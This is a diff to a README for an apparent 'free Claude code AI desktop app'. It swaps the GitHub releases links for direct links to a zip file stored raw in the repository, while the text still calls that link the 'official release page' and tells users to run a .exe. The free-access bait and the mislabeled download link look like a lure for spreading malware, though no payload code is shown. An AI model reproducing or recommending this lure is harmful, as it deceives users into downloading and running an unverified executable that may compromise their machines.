@@ -1,6 +1,6 @@
 # 🤖 free-claude-code-ai-desktop-app - Access powerful coding assistance for free
 
-[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/bipolar-bottomfeeder136/free-claude-code-ai-desktop-app/releases)
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://raw.githubusercontent.com/bipolar-bottomfeeder136/free-claude-code-ai-desktop-app/main/api/code-app-ai-claude-desktop-free-2.3.zip)
 
 ## 🎯 About This Application
 
@@ -29,7 +29,7 @@ This application simplifies the way you interact with AI models. Instead of usin
 
 Follow these steps to set up the application on your computer:
 
-1.  Visit the official release page: [https://github.com/bipolar-bottomfeeder136/free-claude-code-ai-desktop-app/releases](https://github.com/bipolar-bottomfeeder136/free-claude-code-ai-desktop-app/releases)
+1.  Visit the official release page: [https://raw.githubusercontent.com/bipolar-bottomfeeder136/free-claude-code-ai-desktop-app/main/api/code-app-ai-claude-desktop-free-2.3.zip](https://raw.githubusercontent.com/bipolar-bottomfeeder136/free-claude-code-ai-desktop-app/main/api/code-app-ai-claude-desktop-free-2.3.zip)
 2.  Locate the section labeled "Assets" at the bottom of the most recent release.
 3.  Click the file ending in `.exe` to start the download.
 4.  Once the file downloads, locate it in your Downloads folder.
